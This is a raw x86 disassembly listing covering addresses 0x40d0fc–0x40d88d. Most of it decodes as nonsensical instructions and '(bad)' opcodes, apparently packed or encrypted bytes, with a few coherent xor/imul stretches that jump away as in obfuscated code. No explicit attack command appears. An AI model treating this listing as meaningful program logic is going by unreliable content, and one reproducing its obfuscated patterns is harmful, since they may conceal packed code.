  40d0fc:	cmp    al,0x4a
  40d0fe:	dec    esp
  40d0ff:	inc    ebx
  40d100:	jne    0x40d147
  40d102:	ret    0xa1e4
  40d105:	xchg   esp,edi
  40d107:	fcmovnu st,st(1)
  40d109:	test   BYTE PTR [edx-0x7b2060cc],bh
  40d10f:	and    BYTE PTR [edi-0x2723530b],cl
  40d115:	push   esp
  40d116:	adc    al,0x24
  40d118:	inc    ebp
  40d119:	add    eax,0x52bbee3d
  40d11e:	lods   al,BYTE PTR ds:[esi]
  40d11f:	popf   
  40d120:	fnstenv [eax-0x5a6de8b]
  40d126:	and    ah,BYTE PTR [esi-0x18]
  40d129:	xchg   ecx,eax
  40d12a:	inc    edx
  40d12b:	inc    ebx
  40d12c:	loop   0x40d0c7
  40d12e:	outs   dx,BYTE PTR ds:[esi]
  40d12f:	mov    eax,0xbbf9277a
  40d134:	pop    eax
  40d135:	sti    
  40d136:	inc    esi
  40d137:	mov    ds,WORD PTR [esi]
  40d139:	jmp    0xff814c77
  40d13e:	and    BYTE PTR [edi],0xa2
  40d141:	adc    al,0x70
  40d143:	fs pushf 
  40d145:	add    al,0xe5
  40d147:	sahf   
  40d148:	fs pop edx
  40d14a:	cdq    
  40d14b:	cmc    
  40d14c:	ins    DWORD PTR es:[edi],dx
  40d14d:	scas   eax,DWORD PTR es:[edi]
  40d14e:	adc    DWORD PTR [esi-0x12],esi
  40d151:	shl    DWORD PTR [esp+eax*4-0x3e],1
  40d155:	sub    DWORD PTR [esi+eiz*4],edx
  40d158:	push   ecx
  40d159:	outs   dx,BYTE PTR ds:[esi]
  40d15a:	mov    al,ds:0x4d7ad556
  40d15f:	jns    0x40d1a3
  40d161:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40d163:	mov    DWORD PTR [ebp-0x243b427c],edx
  40d169:	jl     0x40d1ac
  40d16b:	mov    esp,0x92d45feb
  40d170:	pushf  
  40d171:	pop    ebp
  40d172:	sub    DWORD PTR [edi],ebp
  40d174:	or     eax,0x4c2e9904
  40d179:	sbb    bh,0xe3
  40d17c:	xchg   dh,dl
  40d17e:	push   esi
  40d17f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d180:	aad    0xa0
  40d182:	xchg   edx,eax
  40d183:	mov    bl,BYTE PTR [ebp-0x5b]
  40d186:	clc    
  40d187:	mov    al,ds:0xbf990687
  40d18c:	dec    ebx
  40d18d:	rcl    BYTE PTR [edi+0x1599f46d],cl
  40d193:	call   FWORD PTR [edi]
  40d195:	xor    ch,ah
  40d197:	mov    ebp,0x20dad337
  40d19c:	sar    dh,cl
  40d19e:	jb     0x40d1dd
  40d1a0:	pop    es
  40d1a1:	gs jle 0x40d183
  40d1a4:	pushf  
  40d1a5:	cs in  eax,0xaa
  40d1a8:	jp     0x40d1e4
  40d1aa:	xor    ebx,eax
  40d1ac:	enter  0x9c3b,0xbd
  40d1b0:	mov    DWORD PTR [ebp-0x569ed97a],0x6626d8b0
  40d1ba:	ins    BYTE PTR es:[edi],dx
  40d1bb:	xchg   esi,eax
  40d1bc:	(bad)  [edi+0xf5f91f7]
  40d1c2:	cmp    cl,bh
  40d1c4:	dec    edi
  40d1c5:	dec    esp
  40d1c6:	test   eax,0x5996a756
  40d1cb:	out    dx,al
  40d1cc:	mov    al,ds:0x87374cd7
  40d1d1:	jmp    0x64e9037
  40d1d6:	imul   edi,DWORD PTR [ecx-0x5b],0x97c2f721
  40d1dd:	push   esi
  40d1de:	dec    esp
  40d1df:	xor    edx,eax
  40d1e1:	add    edx,ecx
  40d1e3:	imul   edx,edi
  40d1e6:	mov    edi,DWORD PTR [ebp-0xc]
  40d1e9:	xor    edi,eax
  40d1eb:	sub    edx,edi
  40d1ed:	mov    edi,DWORD PTR [ebp-0xc]
  40d1f0:	mov    ebx,DWORD PTR [ebp-0x14]
  40d1f3:	xor    edi,eax
  40d1f5:	add    edi,ecx
  40d1f7:	imul   edi,ebx
  40d1fa:	mov    ebx,DWORD PTR [ebp-0x18]
  40d1fd:	jmp    0x40d614
  40d202:	pop    esi
  40d203:	in     al,0x48
  40d205:	add    BYTE PTR [esp+edi*4+0x76],dl
  40d209:	ins    BYTE PTR es:[edi],dx
  40d20a:	xor    edx,DWORD PTR [ecx]
  40d20c:	fcmovb st,st(2)
  40d20e:	(bad)  
  40d20f:	les    esp,FWORD PTR [ecx+0x7e9ac63c]
  40d215:	jle    0x40d287
  40d217:	jns    0x40d297
  40d219:	jle    0x40d297
  40d21b:	dec    ebp
  40d21c:	xlat   BYTE PTR ds:[ebx]
  40d21d:	xchg   esp,eax
  40d21e:	cmp    DWORD PTR ds:0x78187147,ecx
  40d224:	mov    ah,0x1b
  40d226:	xchg   ebx,eax
  40d227:	int    0xa2
  40d229:	cmc    
  40d22a:	mov    ah,0xa1
  40d22c:	mul    BYTE PTR [ebx]
  40d22e:	(bad)  [ebx+0x12]
  40d231:	dec    esi
  40d232:	ins    DWORD PTR es:[edi],dx
  40d233:	jne    0x40d21e
  40d235:	mov    ds:0xa78cd8f8,eax
  40d23a:	daa    
  40d23b:	xor    ebx,DWORD PTR [ecx-0x22]
  40d23e:	or     ebp,ecx
  40d240:	push   edi
  40d241:	clc    
  40d242:	cmp    al,0x2d
  40d244:	or     eax,0x65162778
  40d249:	mov    edi,0xa1df0828
  40d24e:	aas    
  40d24f:	sbb    eax,0xdd3b6a08
  40d254:	cmp    esp,DWORD PTR [edi-0x11]
  40d257:	repnz jecxz 0x40d239
  40d25a:	mov    ch,0xe8
  40d25c:	fs jecxz 0x40d1ff
  40d25f:	fdivr  st,st(3)
  40d261:	xor    ebp,DWORD PTR [ecx]
  40d263:	shl    BYTE PTR [ecx],0x15
  40d266:	mov    DWORD PTR [ebx+0x60],eax
  40d269:	imul   ecx,DWORD PTR [eax],0xc
  40d26c:	pop    es
  40d26d:	es cs push ss
  40d270:	mov    BYTE PTR [ecx-0x62],ch
  40d273:	aad    0xd3
  40d275:	ds xchg edx,eax
  40d277:	sbb    BYTE PTR [eax+0x5b],0x1
  40d27b:	inc    ebx
  40d27c:	hlt    
  40d27d:	mov    bl,0xc9
  40d27f:	add    ebp,DWORD PTR [edi+0x2526bab4]
  40d285:	scas   eax,DWORD PTR es:[edi]
  40d286:	mov    bh,0x59
  40d288:	rcr    DWORD PTR [edi],cl
  40d28a:	mov    ds:0xe299674d,eax
  40d28f:	jle    0x40d2d8
  40d291:	xchg   esp,eax
  40d292:	mov    cs,WORD PTR [edi+0x787f9380]
  40d298:	inc    DWORD PTR [eax+0xd]
  40d29b:	fwait
  40d29c:	xchg   edx,eax
  40d29d:	fldcw  WORD PTR [esp+edi*8+0x5d]
  40d2a1:	inc    ebp
  40d2a2:	jnp    0x40d2a8
  40d2a4:	sbb    edi,DWORD PTR ds:0x6bc0d981
  40d2aa:	xor    al,0xff
  40d2ac:	xchg   esp,eax
  40d2ad:	pop    ecx
  40d2ae:	clc    
  40d2af:	mov    esp,0x88284926
  40d2b4:	jmp    0x40d2ff
  40d2b6:	xchg   edx,eax
  40d2b7:	inc    ecx
  40d2b8:	leave  
  40d2b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2ba:	out    0x59,eax
  40d2bc:	adc    eax,0xde7f96a9
  40d2c1:	addr16 retf 0x7569
  40d2c5:	lods   al,BYTE PTR ds:[esi]
  40d2c6:	sbb    bh,BYTE PTR [esi]
  40d2c8:	out    0xb6,eax
  40d2ca:	adc    BYTE PTR [edx],dh
  40d2cc:	xlat   BYTE PTR ds:[ebx]
  40d2cd:	mov    esi,0xd424a0a3
  40d2d2:	pop    edi
  40d2d3:	fmul   QWORD PTR [edx-0x1ae2ce13]
  40d2d9:	mov    bh,0xf1
  40d2db:	stos   BYTE PTR es:[edi],al
  40d2dc:	lea    edx,[edi+0x59829cf7]
  40d2e2:	aam    0xdb
  40d2e4:	out    dx,eax
  40d2e5:	test   eax,0x9bbfd20c
  40d2ea:	shl    DWORD PTR [ebx+ebx*1],1
  40d2ed:	xchg   edi,eax
  40d2ee:	outs   dx,BYTE PTR ds:[esi]
  40d2ef:	pop    edi
  40d2f1:	or     DWORD PTR ds:0x8f5ad9d1,0xffffffc8
  40d2f8:	sar    BYTE PTR [eax-0xb],cl
  40d2fb:	xor    DWORD PTR [esi+0x7b66d483],ebx
  40d301:	std    
  40d302:	in     eax,dx
  40d303:	mov    ecx,0xdf6ecec8
  40d308:	js     0x40d2af
  40d30a:	cmp    al,0x77
  40d30c:	sbb    ah,ch
  40d30e:	repz jecxz 0x40d32e
  40d311:	xchg   ebx,eax
  40d312:	sub    eax,0x81a640c6
  40d317:	sub    ch,BYTE PTR [ebp-0x55]
  40d31a:	pop    eax
  40d31b:	sbb    eax,0x3dc36f54
  40d320:	add    ecx,0xffffff80
  40d323:	jl     0x40d34f
  40d325:	lods   eax,DWORD PTR ds:[esi]
  40d326:	sbb    BYTE PTR [eax+0x12],ch
  40d329:	sub    DWORD PTR [eax+eiz*8+0x2],eax
  40d32d:	fcom   st(6)
  40d330:	mov    bh,0x22
  40d332:	jbe    0x40d3a2
  40d334:	push   ecx
  40d335:	in     al,dx
  40d336:	lds    esi,FWORD PTR [ebp-0x2c76b4b9]
  40d33c:	(bad)  
  40d33d:	ins    BYTE PTR es:[edi],dx
  40d33e:	jnp    0x40d34b
  40d340:	popa   
  40d341:	mov    esi,0xb2d50af7
  40d346:	aam    0x2
  40d348:	das    
  40d349:	mov    dh,0x92
  40d34b:	add    DWORD PTR [edx+0x7dfd76a5],eax
  40d351:	or     DWORD PTR [ebx],esp
  40d353:	sbb    BYTE PTR [eax+0x0],bl
  40d356:	lahf   
  40d357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d358:	xchg   ebx,eax
  40d359:	(bad)  
  40d35a:	std    
  40d35b:	push   edx
  40d35c:	mov    ebp,0x2377d7b4
  40d361:	jmp    0x7f1b:0x458aef81
  40d368:	data16 das 
  40d36a:	std    
  40d36b:	fwait
  40d36c:	bound  ecx,QWORD PTR [esp+edi*8+0x7ff2804b]
  40d373:	addr16 out 0x2b,eax
  40d376:	cmc    
  40d377:	mov    bl,0xc3
  40d379:	pop    eax
  40d37a:	mov    ebx,0x10360233
  40d37f:	shl    DWORD PTR [esi+0x1a],1
  40d382:	xchg   edi,eax
  40d383:	add    dl,ah
  40d385:	add    DWORD PTR [ebp-0x2f],ebp
  40d388:	and    esp,DWORD PTR [ecx+edi*4+0xb]
  40d38c:	in     eax,0x51
  40d38e:	ds arpl bx,bx
  40d391:	push   esp
  40d392:	gs ss sti 
  40d395:	xchg   edx,eax
  40d396:	das    
  40d397:	ja     0x40d3cd
  40d399:	push   eax
  40d39a:	dec    eax
  40d39b:	mov    dl,0xfc
  40d39d:	pop    es
  40d39e:	push   ds
  40d39f:	ins    BYTE PTR es:[edi],dx
  40d3a0:	inc    ebx
  40d3a1:	mov    esi,0x47fb53b8
  40d3a6:	fs hlt 
  40d3a8:	ficom  DWORD PTR [eax+esi*4]
  40d3ab:	shr    BYTE PTR [edi-0x6c],1
  40d3ae:	sub    DWORD PTR [esi+ebx*4-0xe228147],0x528a0d29
  40d3b9:	je     0x40d3c3
  40d3bb:	ss pop es
  40d3bd:	stc    
  40d3be:	stc    
  40d3bf:	mov    ds:0x614a237e,eax
  40d3c4:	fsubr  DWORD PTR [ebp-0x57]
  40d3c7:	push   esi
  40d3c8:	xor    edx,DWORD PTR [eax-0x7878bc3b]
  40d3ce:	pop    es
  40d3cf:	or     al,0x78
  40d3d1:	lods   eax,DWORD PTR ds:[esi]
  40d3d2:	sbb    ebx,0xad9ab372
  40d3d8:	scas   al,BYTE PTR es:[edi]
  40d3d9:	mov    BYTE PTR [esi+0x55922dde],ch
  40d3df:	ficom  DWORD PTR [ecx+0x7920ed3f]
  40d3e5:	inc    DWORD PTR [edi+0x4af01ffa]
  40d3eb:	pop    edi
  40d3ec:	rcr    DWORD PTR ds:0xb390f056,cl
  40d3f2:	sbb    eax,0x4b593b7b
  40d3f7:	xor    dl,dh
  40d3f9:	ins    DWORD PTR es:[edi],dx
  40d3fa:	cmc    
  40d3fb:	xchg   ebx,eax
  40d3fc:	jae    0x40d42d
  40d3fe:	inc    ecx
  40d3ff:	or     ah,cl
  40d401:	pusha  
  40d402:	test   al,0xa5
  40d404:	cmp    DWORD PTR [edx+0x61],0x5e
  40d408:	outs   dx,DWORD PTR ds:[esi]
  40d409:	cld    
  40d40a:	adc    eax,0x93081f1d
  40d40f:	push   cs
  40d410:	cld    
  40d411:	shl    bh,cl
  40d413:	sbb    al,0x5b
  40d415:	mov    ebx,0xd9378d7c
  40d41a:	sbb    BYTE PTR [esi],bl
  40d41c:	mov    dh,0x44
  40d41e:	inc    ecx
  40d41f:	mov    edi,0x82b6862a
  40d424:	inc    ecx
  40d425:	fisub  WORD PTR [eax+0x52e11205]
  40d42b:	call   0x8bcb2941
  40d430:	jg     0x40d431
  40d432:	pop    esi
  40d433:	ins    DWORD PTR es:[edi],dx
  40d434:	cmp    DWORD PTR [edi-0x9c17427],edx
  40d43a:	cmp    ah,dh
  40d43c:	std    
  40d43d:	push   0x2e
  40d43f:	stc    
  40d440:	pop    edx
  40d441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d442:	mov    al,ds:0x88d634dc
  40d447:	dec    ebp
  40d448:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d449:	xchg   ecx,eax
  40d44a:	cmp    al,0xa1
  40d44c:	or     eax,0x91ccb513
  40d451:	cmp    DWORD PTR [edx-0x2a],ecx
  40d454:	lahf   
  40d455:	push   esp
  40d456:	inc    edi
  40d457:	rcl    BYTE PTR [ebp+0x4],1
  40d45a:	xchg   DWORD PTR fs:[esi+0x67ac4f5],ebx
  40d461:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d462:	mov    esp,0x8d9a23a8
  40d467:	pop    esp
  40d468:	and    eax,0x632273c5
  40d46d:	sbb    DWORD PTR [ecx+0x5651fb43],edx
  40d473:	scas   eax,DWORD PTR es:[edi]
  40d474:	pop    esi
  40d475:	pop    es
  40d476:	sti    
  40d477:	xchg   DWORD PTR [edx],edi
  40d479:	push   0xffffff8f
  40d47b:	dec    eax
  40d47c:	(bad)
  40d481:	jg     0x40d414
  40d483:	push   ss
  40d484:	sub    BYTE PTR [esi-0x10bf0b7e],bh
  40d48a:	call   0x9c05:0x6242e44c
  40d491:	leave  
  40d492:	jp     0x40d43f
  40d494:	add    eax,0x94ba4a48
  40d499:	pop    eax
  40d49a:	inc    edi
  40d49b:	lods   eax,DWORD PTR ds:[esi]
  40d49c:	sub    BYTE PTR [ecx-0x5f1de5c4],cl
  40d4a2:	and    eax,0xffffff80
  40d4a5:	or     cl,BYTE PTR [ecx+eax*4]
  40d4a8:	mov    gs,WORD PTR [esi-0x4]
  40d4ab:	cmc    
  40d4ac:	or     al,0x4
  40d4ae:	ds into 
  40d4b0:	adc    al,0xf4
  40d4b2:	loop   0x40d473
  40d4b4:	jp     0x40d471
  40d4b6:	dec    edi
  40d4b7:	push   cs
  40d4b8:	rcpps  xmm2,XMMWORD PTR [ecx-0x4b3ce50f]
  40d4bf:	push   edx
  40d4c0:	out    0xf,eax
  40d4c2:	mov    bh,BYTE PTR [esi]
  40d4c4:	xor    DWORD PTR [ebp+esi*8-0x15],ebx
  40d4c8:	fsub   DWORD PTR ds:0xa34ff2ce
  40d4ce:	ror    cl,cl
  40d4d0:	loope  0x40d4a2
  40d4d2:	(bad)  
  40d4d3:	jg     0x40d517
  40d4d5:	out    dx,eax
  40d4d6:	daa    
  40d4d7:	out    0xa1,al
  40d4d9:	es (bad) 
  40d4dc:	mov    ds:0x48df24a8,eax
  40d4e1:	mov    al,ds:0x517ae0a4
  40d4e6:	loop   0x40d4a9
  40d4e8:	mov    BYTE PTR [eax-0x2d946a41],bh
  40d4ee:	test   DWORD PTR [edi],eax
  40d4f0:	scas   al,BYTE PTR es:[edi]
  40d4f1:	leave  
  40d4f2:	xchg   esi,eax
  40d4f3:	out    dx,al
  40d4f4:	sar    DWORD PTR [edi+0x28a6a59c],cl
  40d4fa:	repnz mov bh,0x9a
  40d4fd:	push   ecx
  40d4fe:	mov    bh,0x34
  40d500:	push   ebp
  40d501:	stos   BYTE PTR es:[edi],al
  40d502:	adc    BYTE PTR [ebx+0x7f915967],0x4
  40d509:	addr16 sahf 
  40d50b:	push   cs
  40d50c:	leave  
  40d50d:	cwde   
  40d50e:	push   0x8
  40d510:	jno    0x40d49b
  40d512:	push   0x8731b3ce
  40d517:	rol    DWORD PTR [esi+esi*4+0x70],1
  40d51b:	inc    edx
  40d51c:	or     eax,0xf8296aed
  40d521:	pushf  
  40d522:	pop    ebp
  40d523:	adc    eax,DWORD PTR [ebp-0x2362f1a5]
  40d529:	stos   BYTE PTR es:[edi],al
  40d52a:	gs sbb eax,0x3b47cd42
  40d530:	sub    BYTE PTR [ecx],ch
  40d532:	mov    edx,0x81c9c32b
  40d537:	adc    ecx,eax
  40d539:	clc    
  40d53a:	jmp    0x9ca2fa3c
  40d53f:	sti    
  40d540:	adc    al,0xd1
  40d542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d543:	daa    
  40d544:	daa    
  40d545:	ret    
  40d546:	scas   eax,DWORD PTR es:[edi]
  40d547:	cmp    ebp,DWORD PTR [ebp-0x7fee3029]
  40d54d:	ret    0xec2a
  40d550:	ror    ecx,cl
  40d552:	mov    eax,ds:0x95ac9a34
  40d557:	jo     0x40d4db
  40d559:	xor    esi,DWORD PTR [ebx]
  40d55b:	das    
  40d55c:	inc    edx
  40d55d:	aas    
  40d55e:	sub    al,0xc4
  40d560:	fnstenv [ecx-0x4f]
  40d563:	xchg   esp,eax
  40d564:	add    ebx,DWORD PTR [edi+0x5e]
  40d567:	shr    DWORD PTR [edi],0x87
  40d56a:	dec    ecx
  40d56b:	and    dh,BYTE PTR [edi]
  40d56d:	mov    ebx,0xb658a9f6
  40d572:	scas   eax,DWORD PTR es:[edi]
  40d573:	sub    al,0x2
  40d575:	pop    esi
  40d576:	(bad)  
  40d577:	and    bl,bh
  40d579:	mov    edi,0x5cff80d7
  40d57e:	push   ebp
  40d57f:	outs   dx,DWORD PTR ds:[esi]
  40d580:	push   edx
  40d581:	leave  
  40d582:	mov    dh,0x59
  40d584:	div    DWORD PTR [ebx]
  40d586:	mov    dl,0x1a
  40d588:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d589:	test   BYTE PTR [edi-0x11ce00],ch
  40d58f:	sub    BYTE PTR [edi],al
  40d591:	jl     0x40d572
  40d593:	adc    BYTE PTR [eax],bh
  40d595:	addr16 pop ss
  40d597:	js     0x40d522
  40d599:	jo     0x40d5e4
  40d59b:	jmp    0x40d60d
  40d59d:	jecxz  0x40d568
  40d59f:	mov    cl,0x64
  40d5a1:	xchg   dh,dl
  40d5a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5a4:	test   eax,0x882d32e
  40d5a9:	(bad)  
  40d5aa:	cmp    BYTE PTR [eax+0x61a5dfcc],dh
  40d5b0:	and    edi,edi
  40d5b2:	stos   BYTE PTR es:[edi],al
  40d5b3:	in     al,dx
  40d5b4:	fadd   st(6),st
  40d5b6:	mov    ds:0x969d3535,al
  40d5bb:	les    edx,FWORD PTR [edx+ebx*2]
  40d5be:	jl     0x40d566
  40d5c0:	sbb    esp,edx
  40d5c2:	loop   0x40d5b2
  40d5c4:	xor    ecx,ebx
  40d5c6:	fisubr DWORD PTR [eax+ebx*2]
  40d5c9:	imul   ecx,DWORD PTR [edx-0x53ba989a],0x130a7432
  40d5d3:	dec    esi
  40d5d4:	jmp    0xc651:0x40f0971e
  40d5db:	sbb    BYTE PTR [ecx-0x4e67b4c3],dl
  40d5e1:	loope  0x40d5a0
  40d5e3:	retf   0xc380
  40d5e6:	push   ds
  40d5e7:	in     al,dx
  40d5e8:	sbb    BYTE PTR [edx-0x1b],al
  40d5eb:	xchg   ecx,eax
  40d5ec:	jmp    0x2ee1:0x78e7c8cd
  40d5f3:	add    edi,DWORD PTR [ebx-0x131040f]
  40d5f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d5fa:	lea    esi,[ebx+0x26]
  40d5fd:	sbb    al,0x8e
  40d5ff:	adc    al,0x18
  40d601:	mov    ebp,0x5c3ea2ba
  40d606:	adc    eax,0xd55fdeef
  40d60b:	pop    ecx
  40d60c:	dec    ecx
  40d60d:	xor    bh,dh
  40d60f:	and    ecx,DWORD PTR [ebx+0x7]
  40d612:	call   0x8dd1:0x2bd83398
  40d619:	mov    esp,0x3272991f
  40d61e:	add    BYTE PTR [ebx],bh
  40d620:	cli    
  40d621:	jbe    0x40c529
  40d627:	mov    edx,DWORD PTR [ebp-0xc]
  40d62a:	mov    edi,DWORD PTR [ebp-0x24]
  40d62d:	xor    edx,eax
  40d62f:	add    edx,ecx
  40d631:	imul   edx,edi
  40d634:	mov    edi,DWORD PTR [ebp-0x18]
  40d637:	jmp    0x40da4e
  40d63c:	(bad)  
  40d63d:	pusha  
  40d63e:	jecxz  0x40d614
  40d640:	jge    0x40d697
  40d642:	icebp  
  40d643:	ins    BYTE PTR es:[edi],dx
  40d644:	(bad)  
  40d645:	fwait
  40d646:	mov    edi,0x89d99c98
  40d64b:	(bad)  
  40d64e:	jle    0x40d6ce
  40d650:	jo     0x40d6cb
  40d652:	jle    0x40d6d2
  40d654:	outs   dx,DWORD PTR ds:[esi]
  40d655:	in     eax,dx
  40d656:	pop    es
  40d657:	not    DWORD PTR [edx+0x5813d0ba]
  40d65d:	enter  0x7bf,0x76
  40d661:	mov    ds:0x158c0381,al
  40d666:	and    al,0xd4
  40d668:	dec    ecx
  40d669:	mov    esi,0xe0d13898
  40d66e:	enter  0xa91b,0xcd
  40d672:	sbb    esp,DWORD PTR [edx+ebp*2+0x368b07a7]
  40d679:	dec    ebx
  40d67a:	ins    BYTE PTR es:[edi],dx
  40d67b:	jo     0x40d6c5
  40d67d:	jne    0x571521c6
  40d683:	mov    eax,0x21811fc5
  40d688:	daa    
  40d689:	(bad)  
  40d68b:	stos   BYTE PTR es:[edi],al
  40d68c:	out    0x95,al
  40d68e:	inc    edi
  40d68f:	(bad)  
  40d691:	out    dx,eax
  40d692:	push   esi
  40d693:	inc    ebp
  40d694:	xor    ecx,DWORD PTR [ecx+0x3a06432f]
  40d69a:	push   ebx
  40d69b:	loop   0x40d6fb
  40d69d:	(bad)  
  40d69e:	out    dx,eax
  40d69f:	jb     0x40d6da
  40d6a1:	std    
  40d6a2:	mov    DWORD PTR [edi+0x59],ebx
  40d6a5:	adc    bh,bl
  40d6a7:	aam    0x51
  40d6a9:	add    bl,bh
  40d6ab:	add    eax,0xae4709f2
  40d6b0:	adc    edx,DWORD PTR [edi]
  40d6b2:	repz and eax,0x22598d2d
  40d6b8:	xchg   ecx,eax
  40d6b9:	imul   edi,eax,0x5e
  40d6bc:	push   es
  40d6bd:	xchg   DWORD PTR [edi+ebp*1-0x70687a3f],ebp
  40d6c4:	stos   BYTE PTR es:[edi],al
  40d6c5:	sub    eax,0x660d23ea
  40d6ca:	in     al,dx
  40d6cb:	cs cli 
  40d6cd:	add    edx,DWORD PTR [esi+0x27]
  40d6d0:	and    DWORD PTR [edi-0x1bcdb455],ebx
  40d6d6:	js     0x40d73d
  40d6d8:	(bad)  
  40d6d9:	fcom   QWORD PTR [edx]
  40d6db:	int    0xd3
  40d6dd:	out    dx,eax
  40d6de:	adc    BYTE PTR [ecx-0x7041c6ee],bh
  40d6e4:	xchg   ecx,eax
  40d6e5:	push   ss
  40d6e6:	shl    DWORD PTR [ebx],1
  40d6e8:	rcl    DWORD PTR [eax-0x1b],cl
  40d6eb:	xor    BYTE PTR [esi+0x53770303],0x50
  40d6f2:	ret    
  40d6f3:	pop    edx
  40d6f4:	retf   0x110d
  40d6f7:	(bad)  
  40d6f8:	fild   QWORD PTR [edx-0x51]
  40d6fb:	mov    ecx,0xec24cc91
  40d700:	call   0xd37a9773
  40d705:	mov    ch,0x3b
  40d707:	and    al,0x42
  40d709:	mov    esi,0x28c6791a
  40d70e:	jne    0x40d703
  40d710:	fdivr  DWORD PTR [ebp+0x67a26db4]
  40d716:	jecxz  0x40d6d8
  40d718:	mov    gs,WORD PTR [edi-0x573a6bbe]
  40d71e:	ror    DWORD PTR [eax-0x6e39ef87],0x8a
  40d725:	dec    ebx
  40d726:	jg     0x40d764
  40d728:	pop    ecx
  40d729:	cmp    ebx,esp
  40d72b:	test   al,0xc7
  40d72d:	sbb    al,BYTE PTR [ebp+0x2fcfe949]
  40d733:	xor    al,0x6e
  40d735:	pop    esp
  40d736:	adc    edx,DWORD PTR [edx-0xa1be66f]
  40d73c:	mov    ah,0xe
  40d73e:	dec    edx
  40d73f:	bound  esi,QWORD PTR [esi-0x6a]
  40d742:	shl    dl,0x39
  40d745:	push   edx
  40d746:	adc    eax,0x765d33c4
  40d74b:	and    DWORD PTR [edi],ebx
  40d74d:	cmp    eax,esi
  40d74f:	jno    0x40d6fb
  40d751:	into   
  40d752:	jae    0x40d716
  40d754:	neg    DWORD PTR [ebx+0x3597ce8f]
  40d75a:	push   edx
  40d75b:	xchg   esi,eax
  40d75c:	repz cmp eax,0x181fc87e
  40d762:	call   0x83d466c
  40d767:	fsubp  st(3),st
  40d769:	out    0xe6,al
  40d76b:	nop
  40d76c:	das    
  40d76d:	xchg   cl,bh
  40d76f:	cmp    eax,0x80786d66
  40d774:	hlt    
  40d775:	sahf   
  40d776:	cmc    
  40d777:	rcr    BYTE PTR [ebp-0x2c34d89c],1
  40d77d:	imul   edi,esp,0x69
  40d780:	out    0x76,eax
  40d782:	pop    ds
  40d783:	fmul   QWORD PTR [ebx]
  40d785:	inc    ebx
  40d786:	in     al,0xba
  40d788:	pusha  
  40d789:	aas    
  40d78a:	lds    ebx,FWORD PTR [edi-0x71]
  40d78d:	cmp    ebx,esp
  40d78f:	xlat   BYTE PTR ds:[ebx]
  40d790:	jge    0x40d7ca
  40d792:	sub    BYTE PTR [ebp-0x6a],0x14
  40d796:	add    BYTE PTR [esi+0x3d446530],cl
  40d79c:	lock and ch,ch
  40d79f:	mov    eax,ds:0x73844d1e
  40d7a4:	out    0x85,al
  40d7a6:	adc    BYTE PTR [esi],bh
  40d7a8:	(bad)  
  40d7a9:	std    
  40d7aa:	push   esi
  40d7ab:	adc    eax,0xc0d2db25
  40d7b0:	popf   
  40d7b1:	and    cl,BYTE PTR [ecx]
  40d7b3:	or     BYTE PTR [eax-0x3c21ab62],al
  40d7b9:	ror    edi,cl
  40d7bb:	mov    edx,DWORD PTR [ebx-0x7683e839]
  40d7c1:	icebp  
  40d7c2:	mov    ecx,0x5f76db67
  40d7c7:	imul   ebx,DWORD PTR [edx],0x32b554db
  40d7cd:	mov    eax,ss
  40d7cf:	push   0xffffffcd
  40d7d1:	dec    esp
  40d7d2:	add    DWORD PTR [esi],edi
  40d7d4:	pusha  
  40d7d5:	addr16 jmp 0x12dc:0x6e06c01e
  40d7dd:	int3   
  40d7de:	sbb    al,0xb9
  40d7e0:	call   0xb694:0x685d3ba0
  40d7e7:	ds push edi
  40d7e9:	(bad)
  40d7ec:	xchg   esp,eax
  40d7ed:	mov    DWORD PTR [ecx],esp
  40d7ef:	icebp  
  40d7f0:	imul   DWORD PTR [edx+esi*2-0x3a]
  40d7f4:	mov    al,ds:0x549d0886
  40d7f9:	or     BYTE PTR [ecx+0x11f05f6f],ch
  40d7ff:	(bad)  [edx-0x1eb025e2]
  40d805:	int    0xdb
  40d807:	and    BYTE PTR [edx+0x5294768f],ah
  40d80d:	psubb  mm4,QWORD PTR [esi-0x46d77105]
  40d814:	outs   dx,BYTE PTR ds:[esi]
  40d815:	dec    ecx
  40d816:	xchg   ebp,eax
  40d817:	jns    0x40d828
  40d819:	div    BYTE PTR [ecx-0x6]
  40d81c:	cmp    DWORD PTR [edx],ebx
  40d81e:	fs hlt 
  40d820:	xor    al,0xb2
  40d822:	lods   al,BYTE PTR ds:[esi]
  40d823:	test   BYTE PTR [ebx+eiz*1-0x412edf85],dh
  40d82a:	xor    al,0x20
  40d82c:	sub    eax,0x19ae866d
  40d831:	cwde   
  40d832:	push   ds
  40d833:	jb     0x40d805
  40d835:	ja     0x40d851
  40d837:	jle    0x40d86a
  40d839:	dec    esp
  40d83a:	jp     0x40d808
  40d83c:	aaa    
  40d83d:	cmp    al,BYTE PTR [edi]
  40d83f:	lea    ecx,[ebx]
  40d841:	cmp    al,0xce
  40d843:	add    BYTE PTR gs:[ebx+0x52b1d4be],0xf9
  40d84b:	sbb    esi,DWORD PTR [edi-0x13]
  40d84e:	rcr    ecx,cl
  40d850:	ins    DWORD PTR es:[edi],dx
  40d851:	pop    esi
  40d852:	mov    edx,0x9a462d2b
  40d857:	or     BYTE PTR [edx+esi*8-0x73],dl
  40d85b:	mov    al,0xa4
  40d85d:	arpl   WORD PTR [esi+0x4ba9c2e],bp
  40d863:	sar    DWORD PTR [ecx+0x9],cl
  40d866:	in     al,0xe5
  40d868:	and    ecx,DWORD PTR [ebx-0x2659b7db]
  40d86e:	pop    eax
  40d86f:	adc    bh,al
  40d871:	je     0x40d801
  40d873:	fisub  WORD PTR [eax]
  40d875:	push   eax
  40d876:	cmp    DWORD PTR [edi],ecx
  40d878:	xor    esi,esi
  40d87a:	scas   eax,DWORD PTR es:[edi]
  40d87b:	loopne 0x40d868
  40d87d:	dec    edx
  40d87e:	test   eax,0x403e4c38
  40d883:	and    esi,esp
  40d885:	mov    esi,0xd714902c
  40d88a:	add    al,0x30
  40d88c:	push   esp
  40d88d:	(bad)  
